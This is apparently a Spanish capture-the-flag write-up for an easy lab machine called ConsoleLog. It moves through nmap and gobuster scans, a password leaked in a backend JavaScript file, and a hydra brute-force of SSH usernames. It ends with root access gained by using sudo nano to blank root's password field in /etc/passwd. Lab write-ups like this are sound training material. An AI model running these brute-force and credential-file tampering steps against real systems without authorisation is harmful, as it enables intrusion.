Maquina: ConsoleLog

Autor: El Pingüino de Mario

Dificultad: Facil

![Captura de pantalla 2024-12-06 180027](https://github.com/user-attachments/assets/5150c561-f487-401d-93a8-2ec8bbb90d3b)

Hacemos ping para ver si hay conexion 

ping 172.17.0.2 -c 1

![Captura de pantalla 2024-12-06 180422](https://github.com/user-attachments/assets/ed015eac-14b2-475c-bdc3-e3d8556f3526)

Hacemos un escaneo de puertos con nmap 

sudo nmap -p- --open -sCV --min-rate 5000 -sS -Pn -n 172.17.0.2 -vvv

![Captura de pantalla 2024-12-06 180459](https://github.com/user-attachments/assets/d85390d4-64c8-40c5-848b-147c675fce3f)

navegamos por la web y miramos el source code

172.17.0.2

![Captura de pantalla 2024-12-06 180558](https://github.com/user-attachments/assets/cec418ff-d49b-4690-bf66-5fcad5402d78)

Encontramos en el source code que tiene un enlace a authentication.js

![Captura de pantalla 2024-12-06 180629](https://github.com/user-attachments/assets/a28ac2e3-5a51-4276-9f51-b5b205bf4137)

172.17.0.2/authentication.js

![Captura de pantalla 2024-12-06 180642](https://github.com/user-attachments/assets/cccc33dc-6c4b-4187-9027-7498ae4e91d2)

Hacemos un escaneo de directorios y vemos que tenemos uno que se llama back-end

gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://172.17.0.2

![Captura de pantalla 2024-12-06 180723](https://github.com/user-attachments/assets/d3e5f17c-cc56-4e6c-9768-272d962a54c8)

Navegamos al directorio /backend podemos observar que tenemos diversos archivos

![Captura de pantalla 2024-12-06 180812](https://github.com/user-attachments/assets/9deff84b-75fa-4c9c-a4c3-83b672d03ff4)

Hay uno que se llama server.js, parece que este servidor escucha peticiones POST en la ruta /recurso/ y devuelve una contraseña si el token proporcionado es correcto

172.17.0.2/backend/server.js

descubrimos un posible password

![Captura de pantalla 2024-12-06 180829](https://github.com/user-attachments/assets/b1a4c7db-355c-4883-a541-f0d693ce2203)

usamos hydra para descubrir el usuario de la credencial conseguida

hydra -L /usr/share/wordlists/rockyou.txt -p lapassworddebackupmaschingonadetodas ssh://172.17.0.2:5000

![Captura de pantalla 2024-12-06 181500](https://github.com/user-attachments/assets/de0ccdb5-2cf5-416e-85a3-7f8287f217f9)

nos conectamos por ssh con las credenciales obtenidas

ssh lovely@172.17.0.2 -p 5000

lapassworddebackupmaschingonadetodas

![Captura de pantalla 2024-12-06 181802](https://github.com/user-attachments/assets/d0f9cf7b-a671-4e84-ad87-bfb3eb72ea00)

realizamos un sudo -l y podemos observar que tenemos la capacidad de ejecutar comandos como root usando nano y siendo así podemos editar el archivo passwd y quitarle la x para poder acceder sin credenciales

![Captura de pantalla 2024-12-06 182549](https://github.com/user-attachments/assets/a8f0a09e-89e6-4dfe-83e8-210b7d2d4c93)

cd /

![Captura de pantalla 2024-12-06 182224](https://github.com/user-attachments/assets/77a72b1b-5966-4b24-b1c2-150514113dc6)

./usr/bin/nano /etc/passwd

![Captura de pantalla 2024-12-06 182234](https://github.com/user-attachments/assets/19538570-6abc-41b0-b29c-26f52492289e)

borramos la x en root y guardamos

![Captura de pantalla 2024-12-06 182212](https://github.com/user-attachments/assets/e9483438-ca29-4cd7-9337-094a65c0b222)

cat /etc/passwd

![Captura de pantalla 2024-12-06 182332](https://github.com/user-attachments/assets/8389846c-38af-4cc8-9f9f-5b60a0613250)

su root

whoami

![Captura de pantalla 2024-12-06 182325](https://github.com/user-attachments/assets/d64f8916-42f3-403c-be53-6dee2436b8be)
